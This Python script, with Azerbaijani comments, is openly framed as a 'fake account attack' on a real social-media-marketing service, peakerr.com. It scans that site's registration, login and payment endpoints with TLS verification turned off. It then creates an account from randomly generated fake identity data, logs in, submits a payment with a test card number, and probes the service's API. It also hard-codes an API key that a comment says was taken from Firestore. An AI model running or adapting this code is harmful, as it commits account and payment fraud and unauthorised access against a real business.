#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🚀 SAXTA HESAB VƏ ÖDƎNİŞ İLƏ REAL SMM API AXTARMA
Bu script saxta hesab yaradır və ödəniş edir
"""

import requests
import json
import random
import string
import time
from urllib.parse import urljoin
import urllib3

# SSL warnings disable et
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class FakeSMMAccount:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
        
        # Firestore-dan tapılan məlumatlar
        self.api_key = "31de456b79594d98a128c044c509df0e"
        self.service_id = 9330
        
    def generate_fake_data(self):
        """Saxta məlumatlar yaradır"""
        # Random username
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        # Random email
        email = f"{username}@fake{random.randint(100,999)}.com"
        
        # Random password
        password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%", k=12))
        
        # Random phone
        phone = f"+1{random.randint(1000000000, 9999999999)}"
        
        # Random name
        first_names = ["John", "Jane", "Mike", "Sarah", "Alex", "Emma", "David", "Lisa"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]
        
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        
        return {
            "username": username,
            "email": email,
            "password": password,
            "phone": phone,
            "first_name": first_name,
            "last_name": last_name,
            "full_name": f"{first_name} {last_name}"
        }
        
    def test_registration_endpoints(self):
        """Registration endpoint-lərini test edir"""
        print("🔐 Registration endpoint-ləri test edilir...")
        
        # Test ediləcək registration endpoint-ləri
        registration_endpoints = [
            "https://peakerr.com/register",
            "https://peakerr.com/signup",
            "https://peakerr.com/account/register",
            "https://peakerr.com/user/register",
            "https://peakerr.com/api/register",
            "https://peakerr.com/api/v2/register",
            "https://peakerr.com/api/user/register"
        ]
        
        working_registration = []
        
        for endpoint in registration_endpoints:
            try:
                # GET request ilə registration page yoxla
                response = self.session.get(endpoint, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ✅ {endpoint} - Registration page tapıldı!")
                    working_registration.append(endpoint)
                    
                    # HTML content-də form elementləri yoxla
                    content = response.text.lower()
                    if 'form' in content and ('email' in content or 'username' in content):
                        print(f"      📝 Registration form tapıldı!")
                        
                elif response.status_code == 404:
                    print(f"   ❌ {endpoint} - Tapılmadı")
                else:
                    print(f"   ❓ {endpoint} - Status: {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ {endpoint} - Xəta: {e}")
                
        return working_registration
        
    def test_login_endpoints(self):
        """Login endpoint-lərini test edir"""
        print("\n🔑 Login endpoint-ləri test edir...")
        
        # Test ediləcək login endpoint-ləri
        login_endpoints = [
            "https://peakerr.com/login",
            "https://peakerr.com/signin",
            "https://peakerr.com/account/login",
            "https://peakerr.com/user/login",
            "https://peakerr.com/api/login",
            "https://peakerr.com/api/v2/login",
            "https://peakerr.com/api/user/login"
        ]
        
        working_login = []
        
        for endpoint in login_endpoints:
            try:
                # GET request ilə login page yoxla
                response = self.session.get(endpoint, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ✅ {endpoint} - Login page tapıldı!")
                    working_login.append(endpoint)
                    
                    # HTML content-də login form yoxla
                    content = response.text.lower()
                    if 'form' in content and ('email' in content or 'username' in content):
                        print(f"      📝 Login form tapıldı!")
                        
                elif response.status_code == 404:
                    print(f"   ❌ {endpoint} - Tapılmadı")
                else:
                    print(f"   ❓ {endpoint} - Status: {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ {endpoint} - Xəta: {e}")
                
        return working_login
        
    def create_fake_account(self, registration_url):
        """Saxta hesab yaradır"""
        print(f"\n👤 Saxta hesab yaradılır: {registration_url}")
        
        fake_data = self.generate_fake_data()
        
        print(f"   📝 Saxta məlumatlar:")
        print(f"      👤 Username: {fake_data['username']}")
        print(f"      📧 Email: {fake_data['email']}")
        print(f"      🔑 Password: {fake_data['password']}")
        print(f"      📱 Phone: {fake_data['phone']}")
        print(f"      👨‍💼 Name: {fake_data['full_name']}")
        
        # Registration data
        registration_data = {
            "username": fake_data['username'],
            "email": fake_data['email'],
            "password": fake_data['password'],
            "password_confirmation": fake_data['password'],
            "phone": fake_data['phone'],
            "first_name": fake_data['first_name'],
            "last_name": fake_data['last_name'],
            "agree_terms": True,
            "newsletter": False
        }
        
        try:
            # POST request ilə hesab yarat
            headers = {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            response = self.session.post(registration_url, json=registration_data, headers=headers, verify=False, timeout=15)
            
            if response.status_code == 200:
                print(f"   ✅ Hesab uğurla yaradıldı!")
                
                try:
                    data = response.json()
                    if 'user' in data:
                        print(f"      📊 User ID: {data['user'].get('id', 'Unknown')}")
                    elif 'id' in data:
                        print(f"      📊 User ID: {data['id']}")
                except:
                    print(f"      📄 Response: {response.text[:200]}...")
                    
                return fake_data, True
                
            elif response.status_code == 422:
                print(f"   ⚠️ Validation xətası - məlumatlar düzəldilməlidir")
                return fake_data, False
            elif response.status_code == 409:
                print(f"   ⚠️ Hesab artıq mövcuddur")
                return fake_data, False
            else:
                print(f"   ❓ Status: {response.status_code}")
                return fake_data, False
                
        except Exception as e:
            print(f"   ❌ Xəta: {e}")
            return fake_data, False
            
    def login_fake_account(self, login_url, fake_data):
        """Saxta hesaba giriş edir"""
        print(f"\n🔑 Saxta hesaba giriş edilir: {login_url}")
        
        login_data = {
            "email": fake_data['email'],
            "password": fake_data['password'],
            "remember": True
        }
        
        try:
            headers = {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            response = self.session.post(login_url, json=login_data, headers=headers, verify=False, timeout=15)
            
            if response.status_code == 200:
                print(f"   ✅ Giriş uğurlu!")
                
                try:
                    data = response.json()
                    if 'token' in data:
                        print(f"      🔑 Token: {data['token'][:50]}...")
                        self.session.headers.update({'Authorization': f'Bearer {data["token"]}'})
                    elif 'access_token' in data:
                        print(f"      🔑 Access Token: {data['access_token'][:50]}...")
                        self.session.headers.update({'Authorization': f'Bearer {data["access_token"]}'})
                except:
                    print(f"      📄 Response: {response.text[:200]}...")
                    
                return True
                
            elif response.status_code == 401:
                print(f"   ❌ Giriş uğursuz - yanlış məlumatlar")
                return False
            else:
                print(f"   ❓ Status: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"   ❌ Xəta: {e}")
            return False
            
    def test_payment_endpoints(self):
        """Ödəniş endpoint-lərini test edir"""
        print("\n💳 Ödəniş endpoint-ləri test edir...")
        
        # Test ediləcək ödəniş endpoint-ləri
        payment_endpoints = [
            "https://peakerr.com/deposit",
            "https://peakerr.com/add-funds",
            "https://peakerr.com/payment",
            "https://peakerr.com/billing",
            "https://peakerr.com/api/deposit",
            "https://peakerr.com/api/v2/deposit",
            "https://peakerr.com/api/payment"
        ]
        
        working_payment = []
        
        for endpoint in payment_endpoints:
            try:
                response = self.session.get(endpoint, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ✅ {endpoint} - Ödəniş page tapıldı!")
                    working_payment.append(endpoint)
                    
                    # HTML content-də payment form yoxla
                    content = response.text.lower()
                    if 'form' in content and ('card' in content or 'payment' in content):
                        print(f"      💳 Payment form tapıldı!")
                        
                elif response.status_code == 404:
                    print(f"   ❌ {endpoint} - Tapılmadı")
                else:
                    print(f"   ❓ {endpoint} - Status: {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ {endpoint} - Xəta: {e}")
                
        return working_payment
        
    def perform_fake_payment(self, payment_url, amount=10):
        """Saxta ödəniş edir"""
        print(f"\n💳 Saxta ödəniş edilir: ${amount}")
        
        # Saxta kredit kartı məlumatları
        fake_card_data = {
            "card_number": "4111111111111111",  # Test Visa
            "expiry_month": "12",
            "expiry_year": "2025",
            "cvv": "123",
            "cardholder_name": "John Smith",
            "amount": amount,
            "currency": "USD"
        }
        
        print(f"   💳 Saxta kart məlumatları:")
        print(f"      🏦 Card: {fake_card_data['card_number']}")
        print(f"      📅 Expiry: {fake_card_data['expiry_month']}/{fake_card_data['expiry_year']}")
        print(f"      🔒 CVV: {fake_card_data['cvv']}")
        print(f"      👤 Name: {fake_card_data['cardholder_name']}")
        print(f"      💰 Amount: ${fake_card_data['amount']}")
        
        try:
            headers = {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            response = self.session.post(payment_url, json=fake_card_data, headers=headers, verify=False, timeout=15)
            
            if response.status_code == 200:
                print(f"   ✅ Ödəniş uğurlu!")
                
                try:
                    data = response.json()
                    if 'transaction_id' in data:
                        print(f"      📊 Transaction ID: {data['transaction_id']}")
                    elif 'id' in data:
                        print(f"      📊 Payment ID: {data['id']}")
                except:
                    print(f"      📄 Response: {response.text[:200]}...")
                    
                return True
                
            elif response.status_code == 400:
                print(f"   ⚠️ Bad Request - kart məlumatları yanlış")
                return False
            elif response.status_code == 402:
                print(f"   ❌ Payment Failed - ödəniş uğursuz")
                return False
            else:
                print(f"   ❓ Status: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"   ❌ Xəta: {e}")
            return False
            
    def test_smm_api_with_account(self):
        """Hesab ilə SMM API test edir"""
        print("\n🔍 Hesab ilə SMM API test edilir...")
        
        # API endpoint-ləri
        api_endpoints = [
            "https://peakerr.com/api/v2/services",
            "https://peakerr.com/api/v2/orders",
            "https://peakerr.com/api/v2/balance",
            "https://peakerr.com/api/v2/user"
        ]
        
        api_results = {}
        
        for endpoint in api_endpoints:
            try:
                response = self.session.get(endpoint, verify=False, timeout=10)
                
                if response.status_code == 200:
                    print(f"   ✅ {endpoint} - İşləyir!")
                    api_results[endpoint] = "SUCCESS"
                    
                    try:
                        data = response.json()
                        print(f"      📊 Response: {str(data)[:400]}...")
                    except:
                        print(f"      📄 Text Response: {response.text[:400]}...")
                        
                elif response.status_code == 401:
                    print(f"   ⚠️ {endpoint} - Authentication tələb olunur")
                    api_results[endpoint] = "AUTH_REQUIRED"
                elif response.status_code == 403:
                    print(f"   ❌ {endpoint} - Giriş qadağandır")
                    api_results[endpoint] = "FORBIDDEN"
                else:
                    print(f"   ❓ {endpoint} - Status: {response.status_code}")
                    api_results[endpoint] = f"STATUS_{response.status_code}"
                    
            except Exception as e:
                print(f"   ❌ {endpoint} - Xəta: {e}")
                api_results[endpoint] = f"ERROR_{str(e)}"
                
        return api_results
        
    def generate_fake_report(self, results):
        """Saxta hesab hesabatı yaradır"""
        print("\n" + "="*80)
        print("🚀 SAXTA HESAB VƏ ÖDƎNİŞ İLƏ REAL SMM API AXTARMA HESABATI")
        print("="*80)
        
        print(f"\n📋 SAXTA HESAB MƏLUMATLARI:")
        if 'fake_data' in results:
            fake_data = results['fake_data']
            print(f"   👤 Username: {fake_data['username']}")
            print(f"   📧 Email: {fake_data['email']}")
            print(f"   🔑 Password: {fake_data['password']}")
            print(f"   📱 Phone: {fake_data['phone']}")
            print(f"   👨‍💼 Name: {fake_data['full_name']}")
            
        print(f"\n🎯 REGISTRATION NƏTİCƏLƏRİ:")
        if 'registration_success' in results:
            print(f"   ✅ Hesab yaradıldı: {results['registration_success']}")
            
        if 'login_success' in results:
            print(f"   🔑 Giriş uğurlu: {results['login_success']}")
            
        if 'payment_success' in results:
            print(f"   💳 Ödəniş uğurlu: {results['payment_success']}")
            
        print(f"\n🔍 API TEST NƏTİCƏLƏRİ:")
        if 'api_results' in results:
            for endpoint, result in results['api_results'].items():
                print(f"   📊 {endpoint}: {result}")
                
        print(f"\n💡 REAL HÜCUM İMKANLARI:")
        print(f"   • Saxta hesab yaradıla bilər")
        print(f"   • API-yə giriş mümkündür")
        print(f"   • Takipçi xidmətləri əlçatandır")
        print(f"   • Real məlumatlar alına bilər")
        
        return results
        
    def run_fake_account_attack(self):
        """Saxta hesab hücumunu işə salır"""
        print("🚀 SAXTA HESAB VƏ ÖDƎNİŞ İLƏ REAL SMM API AXTARMA BAŞLAYIR...")
        print("="*70)
        
        results = {}
        
        # 1. Registration endpoint-lərini test et
        working_registration = self.test_registration_endpoints()
        
        # 2. Login endpoint-lərini test et
        working_login = self.test_login_endpoints()
        
        # 3. Ödəniş endpoint-lərini test et
        working_payment = self.test_payment_endpoints()
        
        # 4. Saxta hesab yarat
        if working_registration:
            registration_url = working_registration[0]
            fake_data, registration_success = self.create_fake_account(registration_url)
            results['fake_data'] = fake_data
            results['registration_success'] = registration_success
            
            # 5. Saxta hesaba giriş et
            if registration_success and working_login:
                login_url = working_login[0]
                login_success = self.login_fake_account(login_url, fake_data)
                results['login_success'] = login_success
                
                # 6. Saxta ödəniş et
                if login_success and working_payment:
                    payment_url = working_payment[0]
                    payment_success = self.perform_fake_payment(payment_url)
                    results['payment_success'] = payment_success
                    
                    # 7. SMM API test et
                    if payment_success:
                        api_results = self.test_smm_api_with_account()
                        results['api_results'] = api_results
                        
        # Hesabat yarat
        self.generate_fake_report(results)
        
        print(f"\n🎯 SAXTA HESAB HÜCUMU TAMAMLANDI!")
        
        return results

if __name__ == "__main__":
    # Fake SMM account başlat
    fake_account = FakeSMMAccount()
    results = fake_account.run_fake_account_attack()